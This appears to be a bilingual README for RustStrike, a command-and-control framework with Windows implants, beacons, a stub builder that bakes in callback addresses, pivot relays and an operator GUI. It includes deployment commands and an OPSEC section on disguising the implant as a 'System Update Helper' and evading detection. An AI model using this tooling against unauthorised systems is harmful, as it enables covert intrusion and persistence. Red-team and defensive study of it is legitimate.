<div align="center">

# ⚡ RustStrike

**A BOF (Beacon Object File) C2 framework — in-process COFF loader, Windows implants, operator core, and desktop console.**

一个基于 BOF（Beacon Object File）的 C2 框架：进程内 COFF 加载器、Windows 植入体、操作端核心服务与桌面控制台。

[![Platform](https://img.shields.io/badge/platform-Windows%20x64-blue)]()
[![Rust](https://img.shields.io/badge/rust-stable%20MSVC-orange)]()
[![Go](https://img.shields.io/badge/go-core%20%2B%20gui-00ADD8)]()
[![Zig](https://img.shields.io/badge/zig-0.16-F7A41D)]()
[![License](https://img.shields.io/badge/license-see%20Cargo.toml-green)]()

**[English](#-overview) · [中文](#-概述)**

</div>

---

## 🇬🇧 English

### 📌 Overview

RustStrike is a modular C2 skeleton built around an **in-process COFF loader**. An implant receives a base64-encoded COFF object, loads it **in-process** (no `LoadLibrary` / separate loader), resolves its relocations and external symbols, and executes its `go` entry point. Execution is x64-Windows-only; the COFF parser itself is pure, cross-platform, and unit-testable anywhere.

The loader runs **Cobalt-Strike-4.x / AdaptixC2-style** BOFs (verified end-to-end with the AdaptixC2 Extension-Kit `nbtscan`).

> **Deep engineering contract** (wire-format invariants, loader internals, OPSEC layers, conventions) lives in [`CLAUDE.md`](./CLAUDE.md). BOF library docs in [`examples/README.md`](./examples/README.md).

### 🧩 Components

| Component | Path | Role |
|---|---|---|
| **`protocol`** | `crates/protocol` | `ServerMessage` / `ImplantMessage` enums, newline-JSON wire format, base64 helpers. Single source of truth for the wire contract. |
| **`loader`** | `crates/loader` | In-process COFF loader. `coff.rs` (pure cross-platform parser) + `exec.rs`/`beacon.rs` (Windows-only: `VirtualAlloc` RWX image, relocations, externals, Beacon API stubs). |
| **`server`** | `crates/server` | Reference Rust TCP listener + stdin console (single-implant smoke test). |
| **`implant`** | `crates/implant` | Stock Windows reverse-connect implant. One lib backs two bins: `ruststrike-implant` (console) + `ruststrike-implant-silent` (GUI subsystem, no window). Supports relay/pivot. |
| **`beacon`** | `crates/beacon` | **Beacon-style** implant — same wire protocol & loader, but **never gives up**: retries forever on a configurable callback interval. Bins: `ruststrike-beacon` / `ruststrike-beacon-silent`. |
| **`beacon-cycle`** | `crates/beacon-cycle` | **Short-cycle** beacon — short-lived connections on a cadence: connect + hello, drain commands for a `dwell` window, close, sleep, repeat. Periodic short pulses (not a persistent channel). Bins: `ruststrike-beacon-cycle` / `-silent`. |
| **`zig-implant`** | `zig-implant` | A **Zig port** of the Rust implant — functionally identical (reverse-connect, in-process BOF loader, relay/pivot), built with Zig 0.16 + raw Win32/Winsock. |
| **Go core** | `clients/server` | Operator service: TCP transport + HTTP/WS API. Multi-implant sessions, BOF library, SQLite persistence, runtime listener mgmt, stub builder, pivot, task-poll bridge, **agent templates** (`GET /api/agent/templates` from `agents/templates/*.toml`). |
| **Wails GUI** | `clients/client` | Vue 3 + TS desktop console (branded **XStrike**). Drives the real implant via the Go core; mock/demo mode for browser preview. Generate Agent dropdown is data-driven from the agent templates. |

Dependency direction: `protocol` ← `server`; `protocol` + `loader` ← `implant` / `beacon` / `beacon-cycle`.

### 🚀 Quick start

Everything builds natively on Windows. A `rust-toolchain.toml` pins **stable MSVC** (required — see `CLAUDE.md`).

**One-shot** — `run-all.ps1` builds anything missing and launches core + implant + GUI, each in its own window:

```powershell
.\run-all.ps1                # core + implant + GUI
.\run-all.ps1 -NoGui         # core + implant only (drive via REST)
.\run-all.ps1 -NoImplant     # core + GUI only (connect an implant manually)
```

**Manual**:

```sh
# 1. Build the Rust workspace
cargo build --release
# 2. Build the example BOFs (MinGW gcc, e.g. MSYS2)
gcc -c examples/hello.c -o examples/hello.x64.o   # or: x86_64-w64-mingw32-gcc
cp examples/*.x64.o clients/server/bofs/          # stage into the BOF library
# 3. Build the Go core + Wails GUI
cd clients/server && go build -o server.exe .
cd clients/client && wails build                  # → build/bin/xstrike.exe

# (optional) build the Zig implant — requires Zig 0.16
cd zig-implant && zig build -Doptimize=ReleaseSmall
```

### ▶️ Run the stack

```sh
# 1. Go service core (implant TCP :4444, operator HTTP/WS :8091)
RUSTSTRIKE_BOFS=./clients/server/bofs ./clients/server/server.exe 4444 8091
# 2. Implant (reverse-connects to the core)
./target/release/ruststrike-implant.exe 127.0.0.1 4444
#    or the beacon (auto-reconnects forever):
./target/release/ruststrike-beacon.exe 127.0.0.1 4444
# 3. GUI (desktop console over the core's API)
cd clients/client && wails dev   # or: build/bin/xstrike.exe
```

**Drive via REST** (returns a `task_id`; poll `/api/tasks/{id}` for output):

```sh
curl -s http://127.0.0.1:8091/api/implants
curl -X POST "http://127.0.0.1:8091/api/bofs/ps/run?implant=1" \
  -H 'Content-Type: application/json' -d '{"args":""}'
```

### 🎛️ How do I use it now?

1. **Start the core** — `./clients/server/server.exe 4444 8091` (or `run-all.ps1`).
2. **Connect an agent** — run an implant exe pointing at the core's `host:port`. For a real target, **generate a stub** with the callback baked in (below) so it needs no args.
3. **Open the GUI** — `xstrike.exe` (or `wails dev`). It auto-connects to the core at `http://127.0.0.1:8091` (override with `RUSTSTRIKE_CORE`).
4. **Run BOFs** — via the GUI's per-agent tabs (Terminal, Files, Processes, Net, Screenshots) or the BOF library panel; or via REST.
5. **Pivot** — the Pivot tab starts a relay listener on a connected agent; generate a child agent pointing at the parent's relay port to chain implants.
6. **Pick the right implant**:
   - `ruststrike-implant` — dev / when you need relay/pivot.
   - `ruststrike-implant-silent` — deployed agent, no console window.
   - `ruststrike-beacon(-silent)` — intermittent link, must survive server downtime (retries forever).
   - `ruststrike-beacon-cycle(-silent)` — short-cycle: periodic short pulses with configurable Sleep + Dwell (stealthier than a persistent channel).
   - `zig-implant(-silent)` — alternate toolchain, same behavior.

### ⚙️ Configuration (server core)

The Go core loads its config in this precedence (first wins):

1. **CLI flag** — `server -config path/to/config.json` (also `-config=...` / `--config=...`).
2. **Env var** — `RUSTSTRIKE_CONFIG=path/to/config.json`.
3. **Default file** — `ruststrike.config.json` in the CWD, then next to the core exe.

Then **env vars override file values** (same-name env wins), and **positional args override ports** (`server <tcp> <http>`). A minimal config (see [`ruststrike.config.example.json`](./ruststrike.config.example.json)):

```json
{
  "auth": {
    "username": "admin",
    "password": "change-me-password",
    "token": "change-me-long-random-token"
  },
  "server": {
    "implant_bind_ip": "0.0.0.0",
    "implant_tcp_port": "4444",
    "operator_bind_ip": "0.0.0.0",
    "operator_http_port": "8091",
    "default_listener_name": "default"
  },
  "paths": {
    "bof_dir": "./clients/server/bofs",
    "db_path": "./ruststrike.db",
    "implant_exe": "./target/release/ruststrike-implant.exe"
  }
}
```

| Field | Env override | Purpose |
|---|---|---|
| `auth.username` / `password` / `token` | `RUSTSTRIKE_AUTH_*` | Operator HTTP/WS auth. `run-all.ps1` auto-generates a random password + token if unset. |
| `server.implant_bind_ip` / `implant_tcp_port` | `RUSTSTRIKE_TCP_BIND_IP` / `RUSTSTRIKE_TCP_PORT` | Implant transport listener (the boot listener is created from `default_listener_name` + these). |
| `server.operator_bind_ip` / `operator_http_port` | `RUSTSTRIKE_HTTP_BIND_IP` / `RUSTSTRIKE_HTTP_PORT` | Operator HTTP/WS listener for the GUI. |
| `paths.bof_dir` | `RUSTSTRIKE_BOFS` | BOF library directory. |
| `paths.db_path` | `RUSTSTRIKE_DB` | SQLite DB location. |
| `paths.implant_exe` | `RUSTSTRIKE_IMPLANT_EXE` | **Base stock-implant exe** for the stub builder. |

> ⚠️ Unknown JSON fields are **rejected** (`DisallowUnknownFields`) — copy the example file and edit, don't hand-write.

### 🧱 Where to place the base agent exes (stub builder)

When you click **Generate Agent** (GUI) or call `/api/stub/build`, the core patches a **prebuilt base agent exe** by appending a `host\0port\0` (beacon: `+interval\0`; cycle: `+sleep\0+dwell\0`) trailer. It must find that base exe — and **beacon / beacon-cycle have no `paths` config field**, so a missing base is the #1 cause of a `503 base … exe not found` error.

`resolveBaseImplantExe` looks for the base in this order:

| # | Stock implant | Beacon | Beacon-cycle |
|---|---|---|---|
| 1 | `paths.implant_exe` (config) | — (no field) | — (no field) |
| 2 | `RUSTSTRIKE_IMPLANT_EXE` | `RUSTSTRIKE_BEACON_EXE` | `RUSTSTRIKE_BEACON_CYCLE_EXE` |
| 3 | `<core-exe-dir>/ruststrike-implant.exe` | `<core-exe-dir>/ruststrike-beacon.exe` | `<core-exe-dir>/ruststrike-beacon-cycle.exe` |
| 4 | `../../target/release/ruststrike-implant.exe` | `../../target/release/ruststrike-beacon.exe` | `../../target/release/ruststrike-beacon-cycle.exe` |

`silent=true` auto-swaps to the `-silent.exe` sibling in the same dir. The agent exes live in `target/release/` after `cargo build --release`:

```
target/release/ruststrike-implant.exe          target/release/ruststrike-implant-silent.exe
target/release/ruststrike-beacon.exe           target/release/ruststrike-beacon-silent.exe
target/release/ruststrike-beacon-cycle.exe     target/release/ruststrike-beacon-cycle-silent.exe
```

**Do you need to move them?** Depends on how you launch the core:

- **`run-all.ps1`** — sets `RUSTSTRIKE_IMPLANT_EXE` for you; beacon/cycle fall back to `../../target/release/` (works, since the core runs from `clients/server`). **No move needed.**
- **`cd clients/server && ./server.exe`** — step 4 hits `target/release/`. **No move needed.**
- **Core exe copied/launched from elsewhere** — steps 3 & 4 miss. Fix with **one** of:
  - **env var** (recommended, any path): `$env:RUSTSTRIKE_BEACON_CYCLE_EXE = "D:\...\ruststrike-beacon-cycle.exe"` (and `RUSTSTRIKE_BEACON_EXE` / `RUSTSTRIKE_IMPLANT_EXE` for the others).
  - **copy** the 6 exes next to `server.exe` (step 3).
  - **launch from `clients/server`** (step 4).

### 🧩 Agent templates (Generate Agent dropdown)

The Generate Agent dropdown is data-driven from `agents/templates/*.toml` (served at `GET /api/agent/templates`, loaded at core startup). Each template declares the base exe, the stub variant, the GUI options it supports, and default cadence values:

```
agents/templates/implant.toml          # stock implant — persistent channel, relay/pivot
agents/templates/beacon.toml           # auto-reconnect beacon — persistent channel while online
agents/templates/beacon-cycle.toml     # short-cycle beacon — short pulses, sleeps between check-ins
```

Template fields: `id`, `name`, `description`, `base`, `variant` (`implant`/`beacon`/`beacon-cycle`), `supports` (`silent`/`sleep`/`dwell`), `default_sleep`, `default_dwell`. Override the dir with `RUSTSTRIKE_TEMPLATES`; a missing dir is non-fatal (the stub builder falls back to the `beacon`/`cycle` request booleans). In the GUI, **Sleep Time** shows for templates with `sleep` in `supports`, **Dwell Time** for `dwell`; pick the **RustStrike Beacon (Short-Cycle)** template for the short-connection/periodic-callback agent.

### 🔌 Wire contract

Newline-delimited JSON over a single TCP stream. Discriminator is `type`, `snake_case`. `crates/protocol/src/lib.rs` is the source of truth.

- **server → implant:** `hello`, `bof` (`{file, args}` — both base64; `args` is the binary CS-packed arg buffer, **required** even if empty), `relay_listen` (`{relay_id, bind_ip, port}`), `relay_stop` (`{relay_id}`).
- **implant → server:** `hello` / `output` / `error` (`{data}`), `relay_started` (`{relay_id, bind_ip, port}`), `relay_stopped` (`{relay_id}`), `relay_error` (`{relay_id, data}`).

Each message is one line terminated by `\n`. Implant output can be large — the core uses a 16 MB line buffer.

### 🛡️ OPSEC / stealth (release implant)

The release implant is scrubbed to look like an ordinary **"System Update Helper"** application (all in the default release build):

- **PE metadata** (VERSIONINFO + manifest) → "System Update Helper", v10.0.22621.0, `asInvoker`, common-controls v6. PDB reads `updatehelper.pdb`.
- **Debug logs** compile out unless the `verbose` feature is on.
- **Benign string padding** (a fake EULA) dilutes suspicious strings / keeps entropy low (~6.4 bits/byte — normal PE range).
- **XOR-encoded Beacon API symbol names** (never appear in `.rdata`).
- **Build-path remapping** scrubs workspace/user paths out of panic `Location`s; source files are neutrally named (`stubs.rs` / `obj.rs` / `exec.rs`).
- **Two subsystem variants** — console (dev) and silent (GUI subsystem, no window). Command-exec BOFs already spawn children with `CREATE_NO_WINDOW`, so a silent agent runs entirely in the background.

### 🧷 Stub builder (deploy an agent)

The implant reads its callback host:port from an **appended-config trailer** on its own exe (else falls back to CLI args). Deploy one patched binary per target with a baked-in callback — no args on the target.

```sh
# CLI
cd tools/stubbuilder && go build -o stubbuilder.exe .
./stubbuilder.exe ../../target/release/ruststrike-implant.exe out.exe 10.0.0.5 4444
# windowless agent: patch the silent base instead
./stubbuilder.exe ../../target/release/ruststrike-implant-silent.exe out.exe 10.0.0.5 4444

# or via the Go core (used by the GUI's Generate Agent button)
curl -X POST "http://127.0.0.1:8091/api/stub/build" \
  -H 'Content-Type: application/json' -d '{"host":"10.0.0.5","port":"4444","silent":true}'
# -> {"exe_b64":"..."}
```

Re-patching an already-patched exe strips the old trailer first (no accumulation).

### 🔗 Pivot / relay (chain implants)

A connected implant can act as a **relay server** so a second implant (which can reach the parent but not the core) dials the parent and appears online at the core — a CS-style TCP pivot. The parent opens a TCP listener and **splices** each child's stream onto a fresh connection to the core; the child's bytes are transparent newline-JSON, so the core registers it as a normal new implant.

```sh
# 1. Parent implant (id 1) is connected. Start a relay (port 0 = OS-assigned):
curl -X POST "http://127.0.0.1:8091/api/implants/1/relay" \
  -H 'Content-Type: application/json' -d '{"bind_ip":"0.0.0.0","port":0}'
curl -s "http://127.0.0.1:8091/api/implants/1/relays"   # -> [{id, bind_ip, port, state}]
# 2. Generate a child agent pointing at the parent's reachable IP + relay port.
# 3. Run the child — it shows up in GET /api/implants as a new session.
# 4. Stop the relay:
curl -X DELETE "http://127.0.0.1:8091/api/implants/1/relays/rl-xx"
```

In the GUI: open an agent → **Pivot** tab → Start Relay, copy the connect string, then Generate Agent with that host:port. Relay state is **transient** (lives in the parent process; not persisted) and is dropped when the parent disconnects. The **beacon** implant declines relay (`relay_error`) — its link is intermittent; use the stock implant for pivoting.

> ⚠️ **OPSEC:** a TCP listener on the parent is a detection surface. A stealthier named-pipe variant is planned but not yet built.

### 📦 BOF compatibility

The loader runs CS4.x / AdaptixC2-style BOFs. Build third-party BOFs with mingw (`x86_64-w64-mingw32-gcc`); externals are `__imp_LIBRARY$function` imports + `__imp_Beacon*`, resolved via `LoadLibrary`/`GetProcAddress` and the Beacon stubs. Only the data/output Beacon APIs and basic CRT are stubbed; unimplemented `Beacon*` calls fall back to a no-op note. See `CLAUDE.md` "BOF compatibility".

### ⚠️ Limitations

- x64 only; x86 COFFs are rejected at parse time.
- Only the data/output Beacon APIs and basic CRT are stubbed.
- `BeaconPrintf` captures only the first two variadic args.
- BOF image memory is intentionally not freed after execution.
- Relay/pivot is TCP-only (named-pipe variant + SOCKS proxy are planned).
- Download/screenshot output is capped so the base64 fits the core's line buffer.

---

## 🇨🇳 中文

### 📌 概述

RustStrike 是一个围绕**进程内 COFF 加载器**构建的模块化 C2 骨架。植入体接收 base64 编码的 COFF 对象，**在进程内加载**（不使用 `LoadLibrary` 或独立加载器），解析其重定位与外部符号，并执行 `go` 入口点。执行仅支持 x64 Windows；COFF 解析器本身是纯函数、跨平台，可在任意系统上单元测试。

加载器可运行 **Cobalt Strike 4.x / AdaptixC2 风格**的 BOF（已用 AdaptixC2 Extension-Kit 的 `nbtscan` 端到端验证）。

> **完整工程契约**（线协议不变量、加载器内部原理、OPSEC 分层、约定）见 [`CLAUDE.md`](./CLAUDE.md)。BOF 库文档见 [`examples/README.md`](./examples/README.md)。

### 🧩 组件

| 组件 | 路径 | 职责 |
|---|---|---|
| **`protocol`** | `crates/protocol` | `ServerMessage` / `ImplantMessage` 枚举、换行分隔 JSON 线协议、base64 工具。线协议的唯一事实来源。 |
| **`loader`** | `crates/loader` | 进程内 COFF 加载器。`coff.rs`（纯跨平台解析器）+ `exec.rs`/`beacon.rs`（仅 Windows：`VirtualAlloc` RWX 镜像、重定位、外部符号、Beacon API 桩）。 |
| **`server`** | `crates/server` | 参考用 Rust TCP 监听器 + 标准输入控制台（单植入体冒烟测试）。 |
| **`implant`** | `crates/implant` | 标准 Windows 反向连接植入体。一个 lib 支撑两个 bin：`ruststrike-implant`（控制台）+ `ruststrike-implant-silent`（GUI 子系统，无窗口）。支持中继/枢纽。 |
| **`beacon`** | `crates/beacon` | **Beacon 风格**植入体——同样的线协议与加载器，但**永不放弃**：按可配置的回连间隔无限重试。bin：`ruststrike-beacon` / `ruststrike-beacon-silent`。 |
| **`beacon-cycle`** | `crates/beacon-cycle` | **短连** beacon——周期性短连接：连上 + hello，在 `dwell` 窗口内收命令，断开，睡眠，重复。周期性短脉冲（非长连接）。bin：`ruststrike-beacon-cycle` / `-silent`。 |
| **`zig-implant`** | `zig-implant` | Rust 植入体的 **Zig 移植版**——功能一致（反向连接、进程内 BOF 加载器、中继/枢纽），用 Zig 0.16 + 原生 Win32/Winsock 构建。 |
| **Go 核心** | `clients/server` | 操作端服务：TCP 传输 + HTTP/WS API。多植入体会话、BOF 库、SQLite 持久化、运行时监听器管理、stub 构建器、枢纽、任务轮询桥接、**agent 模板**（`GET /api/agent/templates` 读 `agents/templates/*.toml`）。 |
| **Wails GUI** | `clients/client` | Vue 3 + TS 桌面控制台（品牌名 **XStrike**）。桌面模式通过 Go 核心驱动真实植入体；提供 mock/演示模式用于浏览器预览。Generate Agent 下拉框由 agent 模板数据驱动。 |

依赖方向：`protocol` ← `server`；`protocol` + `loader` ← `implant` / `beacon` / `beacon-cycle`。

### 🚀 快速开始

全部在 Windows 上原生构建。`rust-toolchain.toml` 锁定 **stable MSVC**（必需，原因见 `CLAUDE.md`）。

**一键启动** —— `run-all.ps1` 自动构建缺失部分并分窗口启动核心 + 植入体 + GUI：

```powershell
.\run-all.ps1                # 核心 + 植入体 + GUI
.\run-all.ps1 -NoGui         # 仅核心 + 植入体（用 REST 驱动）
.\run-all.ps1 -NoImplant     # 仅核心 + GUI（手动连接植入体）
```

**手动构建**：

```sh
# 1. 构建 Rust workspace
cargo build --release
# 2. 编译示例 BOF（MinGW gcc，如 MSYS2）
gcc -c examples/hello.c -o examples/hello.x64.o   # 或：x86_64-w64-mingw32-gcc
cp examples/*.x64.o clients/server/bofs/          # 暂存到 BOF 库
# 3. 构建 Go 核心 + Wails GUI
cd clients/server && go build -o server.exe .
cd clients/client && wails build                  # → build/bin/xstrike.exe

# （可选）构建 Zig 植入体——需要 Zig 0.16
cd zig-implant && zig build -Doptimize=ReleaseSmall
```

### ▶️ 运行整个栈

```sh
# 1. Go 服务核心（植入体 TCP :4444，操作端 HTTP/WS :8091）
RUSTSTRIKE_BOFS=./clients/server/bofs ./clients/server/server.exe 4444 8091
# 2. 植入体（反向连接到核心）
./target/release/ruststrike-implant.exe 127.0.0.1 4444
#    或 beacon（永久自动重连）：
./target/release/ruststrike-beacon.exe 127.0.0.1 4444
# 3. GUI（通过核心 API 的桌面控制台）
cd clients/client && wails dev   # 或：build/bin/xstrike.exe
```

**用 REST 驱动**（返回 `task_id`，轮询 `/api/tasks/{id}` 获取输出）：

```sh
curl -s http://127.0.0.1:8091/api/implants
curl -X POST "http://127.0.0.1:8091/api/bofs/ps/run?implant=1" \
  -H 'Content-Type: application/json' -d '{"args":""}'
```

### 🎛️ 现在该怎么用？

1. **启动核心** —— `./clients/server/server.exe 4444 8091`（或 `run-all.ps1`）。
2. **连接 agent** —— 运行指向核心 `host:port` 的植入体 exe。真实目标机上请**生成 stub**（见下），把回连地址内置进 exe，无需任何参数。
3. **打开 GUI** —— `xstrike.exe`（或 `wails dev`）。自动连接 `http://127.0.0.1:8091`（用 `RUSTSTRIKE_CORE` 覆盖）。
4. **运行 BOF** —— 通过 GUI 每个 agent 的标签页（终端、文件、进程、网络、截图）或 BOF 库面板；或通过 REST。
5. **枢纽（Pivot）** —— Pivot 标签页在已连接的 agent 上启动中继监听器；生成指向父节点中继端口的子 agent，即可级联植入体。
6. **选对植入体**：
   - `ruststrike-implant` —— 开发 / 需要中继枢纽时。
   - `ruststrike-implant-silent` —— 投放用 agent，无控制台窗口。
   - `ruststrike-beacon(-silent)` —— 链路不稳定、需扛过服务器宕机（永久重试）。
   - `ruststrike-beacon-cycle(-silent)` —— 短连：周期性短脉冲，可配 Sleep + Dwell（比长连接更隐蔽）。
   - `zig-implant(-silent)` —— 换工具链，行为相同。

### ⚙️ 配置（服务端核心）

Go 核心按以下优先级加载配置（先命中者生效）：

1. **命令行参数** —— `server -config path/to/config.json`（也支持 `-config=...` / `--config=...`）。
2. **环境变量** —— `RUSTSTRIKE_CONFIG=path/to/config.json`。
3. **默认文件** —— 当前工作目录的 `ruststrike.config.json`，其次核心 exe 同目录。

之后**环境变量覆盖文件值**（同名 env 优先），**位置参数再覆盖端口**（`server <tcp> <http>`）。最小配置（见 [`ruststrike.config.example.json`](./ruststrike.config.example.json)）：

```json
{
  "auth": {
    "username": "admin",
    "password": "change-me-password",
    "token": "change-me-long-random-token"
  },
  "server": {
    "implant_bind_ip": "0.0.0.0",
    "implant_tcp_port": "4444",
    "operator_bind_ip": "0.0.0.0",
    "operator_http_port": "8091",
    "default_listener_name": "default"
  },
  "paths": {
    "bof_dir": "./clients/server/bofs",
    "db_path": "./ruststrike.db",
    "implant_exe": "./target/release/ruststrike-implant.exe"
  }
}
```

| 字段 | 环境变量覆盖 | 用途 |
|---|---|---|
| `auth.username` / `password` / `token` | `RUSTSTRIKE_AUTH_*` | 操作端 HTTP/WS 认证。`run-all.ps1` 在未设置时会自动生成随机密码 + token。 |
| `server.implant_bind_ip` / `implant_tcp_port` | `RUSTSTRIKE_TCP_BIND_IP` / `RUSTSTRIKE_TCP_PORT` | 植入体传输监听器（启动监听器由 `default_listener_name` + 这两项创建）。 |
| `server.operator_bind_ip` / `operator_http_port` | `RUSTSTRIKE_HTTP_BIND_IP` / `RUSTSTRIKE_HTTP_PORT` | 面向 GUI 的操作端 HTTP/WS 监听器。 |
| `paths.bof_dir` | `RUSTSTRIKE_BOFS` | BOF 库目录。 |
| `paths.db_path` | `RUSTSTRIKE_DB` | SQLite 数据库位置。 |
| `paths.implant_exe` | `RUSTSTRIKE_IMPLANT_EXE` | **stock 植入体基底 exe**，供 stub 构建器使用。 |

> ⚠️ JSON 未知字段会被**拒绝**（`DisallowUnknownFields`）—— 复制示例文件再改，不要手写。

### 🧱 基底 agent exe 放哪里（stub 构建器）

当你在 GUI 点 **Generate Agent** 或调用 `/api/stub/build` 时，核心会在一个**预构建的基底 agent exe** 末尾追加 `host\0port\0`（beacon：再加 `interval\0`；cycle：再加 `sleep\0+dwell\0`）trailer。核心必须能找到这个基底 —— 而 **beacon / beacon-cycle 没有 `paths` 配置字段**，找不到基底是 `503 base … exe not found` 报错的第一大原因。

`resolveBaseImplantExe` 按此顺序查找基底：

| # | stock 植入体 | beacon | beacon-cycle |
|---|---|---|---|
| 1 | `paths.implant_exe`（config） | ——（无字段） | ——（无字段） |
| 2 | `RUSTSTRIKE_IMPLANT_EXE` | `RUSTSTRIKE_BEACON_EXE` | `RUSTSTRIKE_BEACON_CYCLE_EXE` |
| 3 | `<核心 exe 目录>/ruststrike-implant.exe` | `<核心 exe 目录>/ruststrike-beacon.exe` | `<核心 exe 目录>/ruststrike-beacon-cycle.exe` |
| 4 | `../../target/release/ruststrike-implant.exe` | `../../target/release/ruststrike-beacon.exe` | `../../target/release/ruststrike-beacon-cycle.exe` |

`silent=true` 时自动换成同目录的 `-silent.exe` 兄弟。`cargo build --release` 后 agent exe 位于 `target/release/`：

```
target/release/ruststrike-implant.exe          target/release/ruststrike-implant-silent.exe
target/release/ruststrike-beacon.exe           target/release/ruststrike-beacon-silent.exe
target/release/ruststrike-beacon-cycle.exe     target/release/ruststrike-beacon-cycle-silent.exe
```

**需要移动它们吗？** 取决于你怎么启动核心：

- **`run-all.ps1`** —— 已为你设好 `RUSTSTRIKE_IMPLANT_EXE`；beacon/cycle 走第 4 步回退 `../../target/release/`（核心在 `clients/server` 运行，能命中）。**无需移动。**
- **`cd clients/server && ./server.exe`** —— 第 4 步命中 `target/release/`。**无需移动。**
- **核心 exe 被拷贝/从别处启动** —— 第 3、4 步都落空。三选一修复：
  - **环境变量**（推荐，可指向任意路径）：`$env:RUSTSTRIKE_BEACON_CYCLE_EXE = "D:\...\ruststrike-beacon-cycle.exe"`（其余加 `RUSTSTRIKE_BEACON_EXE` / `RUSTSTRIKE_IMPLANT_EXE`）。
  - **拷贝** 6 个 exe 到 `server.exe` 同目录（命中第 3 步）。
  - **从 `clients/server` 启动**（命中第 4 步）。

### 🧩 Agent 模板（Generate Agent 下拉框）

Generate Agent 下拉框由 `agents/templates/*.toml` 数据驱动（核心启动时加载，通过 `GET /api/agent/templates` 提供）。每个模板声明基底 exe、stub variant、支持的 GUI 选项与默认 cadence 值：

```
agents/templates/implant.toml          # 标准植入体——长连接、中继/枢纽
agents/templates/beacon.toml           # 自动重连 beacon——在线时长连接
agents/templates/beacon-cycle.toml     # 短连 beacon——周期短脉冲，间隔睡眠
```

模板字段：`id`、`name`、`description`、`base`、`variant`（`implant`/`beacon`/`beacon-cycle`）、`supports`（`silent`/`sleep`/`dwell`）、`default_sleep`、`default_dwell`。用 `RUSTSTRIKE_TEMPLATES` 覆盖目录；目录缺失不致命（stub 构建器回退到请求里的 `beacon`/`cycle` 布尔）。GUI 中，`supports` 含 `sleep` 的模板显示 **Sleep Time**，含 `dwell` 的显示 **Dwell Time**；选 **RustStrike Beacon (Short-Cycle)** 模板即短连/周期回连 agent。

### 🔌 线协议

单条 TCP 流上的换行分隔 JSON。判别字段为 `type`，`snake_case`。`crates/protocol/src/lib.rs` 是事实来源。

- **服务器 → 植入体：** `hello`、`bof`（`{file, args}`——均为 base64；`args` 是二进制 CS 打包参数缓冲，即使为空也**必填**）、`relay_listen`（`{relay_id, bind_ip, port}`）、`relay_stop`（`{relay_id}`）。
- **植入体 → 服务器：** `hello` / `output` / `error`（`{data}`）、`relay_started`（`{relay_id, bind_ip, port}`）、`relay_stopped`（`{relay_id}`）、`relay_error`（`{relay_id, data}`）。

每条消息一行，以 `\n` 结尾。植入体输出可能很大——核心使用 16 MB 行缓冲。

### 🛡️ OPSEC / 隐蔽（release 植入体）

release 植入体被清洗为一个普通的 **"System Update Helper"** 应用（全部在默认 release 构建中）：

- **PE 元数据**（VERSIONINFO + 清单）→ "System Update Helper"，版本 10.0.22621.0，`asInvoker`，common-controls v6。PDB 为 `updatehelper.pdb`。
- **调试日志**在未开启 `verbose` feature 时编译期消除。
- **良性字符串填充**（一份假 EULA）稀释可疑字符串、压低熵值（~6.4 bits/byte——正常 PE 范围）。
- **XOR 编码的 Beacon API 符号名**（绝不出现在 `.rdata`）。
- **构建路径重映射**把 workspace/用户路径从 panic `Location` 中抹除；源文件中性命名（`stubs.rs` / `obj.rs` / `exec.rs`）。
- **两个子系统变体** —— 控制台（开发）与 silent（GUI 子系统，无窗口）。命令执行类 BOF 已用 `CREATE_NO_WINDOW` 启动子进程，silent agent 完全在后台运行。

### 🧷 Stub 构建器（投放 agent）

植入体从自身 exe 末尾的**追加配置 trailer** 读取回连 host:port（否则回退到命令行参数）。每个目标投放一个内置回连地址的补丁版二进制——目标机上无需参数。

```sh
# 命令行
cd tools/stubbuilder && go build -o stubbuilder.exe .
./stubbuilder.exe ../../target/release/ruststrike-implant.exe out.exe 10.0.0.5 4444
# 无窗口 agent：改用 silent 基底
./stubbuilder.exe ../../target/release/ruststrike-implant-silent.exe out.exe 10.0.0.5 4444

# 或通过 Go 核心（GUI 的 Generate Agent 按钮即用此接口）
curl -X POST "http://127.0.0.1:8091/api/stub/build" \
  -H 'Content-Type: application/json' -d '{"host":"10.0.0.5","port":"4444","silent":true}'
# -> {"exe_b64":"..."}
```

对已补丁的 exe 再次补丁会先剥离旧 trailer（不会累积）。

### 🔗 枢纽 / 中继（级联植入体）

已连接的植入体可作为**中继服务器**，让第二个植入体（能连到父节点但连不到核心）拨号父节点并在核心上线——CS 风格的 TCP 枢纽。父节点开一个 TCP 监听器，把每个子连接**拼接**到一条通往核心的新连接上；子节点的字节是透明 newline-JSON，核心将其登记为普通新植入体。

```sh
# 1. 父植入体（id 1）已连接。启动中继（端口 0 = 系统分配）：
curl -X POST "http://127.0.0.1:8091/api/implants/1/relay" \
  -H 'Content-Type: application/json' -d '{"bind_ip":"0.0.0.0","port":0}'
curl -s "http://127.0.0.1:8091/api/implants/1/relays"   # -> [{id, bind_ip, port, state}]
# 2. 生成一个指向父节点可达 IP + 中继端口的子 agent。
# 3. 运行子 agent——它会出现在 GET /api/implants 中作为新会话。
# 4. 停止中继：
curl -X DELETE "http://127.0.0.1:8091/api/implants/1/relays/rl-xx"
```

在 GUI 中：打开 agent → **Pivot** 标签页 → Start Relay，复制连接串，再用该 host:port 生成 agent。中继状态是**瞬态**的（存在于父进程内，不持久化），父节点断开即丢弃。**beacon** 植入体会拒绝中继（`relay_error`）——其链路是间歇性的；枢纽请用标准植入体。

> ⚠️ **OPSEC：** 父节点上的 TCP 监听器是一个检测面。更隐蔽的命名管道变体已规划但尚未实现。

### 📦 BOF 兼容性

加载器运行 CS4.x / AdaptixC2 风格 BOF。用 mingw（`x86_64-w64-mingw32-gcc`）编译第三方 BOF；外部符号为 `__imp_LIBRARY$function` 导入 + `__imp_Beacon*`，通过 `LoadLibrary`/`GetProcAddress` 与 Beacon 桩解析。仅桩化了数据/输出类 Beacon API 与基础 CRT；未实现的 `Beacon*` 调用回退为 no-op 备注。详见 `CLAUDE.md` "BOF compatibility"。

### ⚠️ 限制

- 仅 x64；解析期即拒绝 x86 COFF。
- 仅桩化了数据/输出类 Beacon API 与基础 CRT。
- `BeaconPrintf` 仅捕获前两个变参。
- BOF 镜像内存在执行后故意不释放。
- 中继/枢纽仅 TCP（命名管道变体 + SOCKS 代理已规划）。
- 下载/截图输出有上限，以保证 base64 装得进核心的行缓冲。

## 📄 License

See the workspace `Cargo.toml`. 详见 workspace `Cargo.toml`。
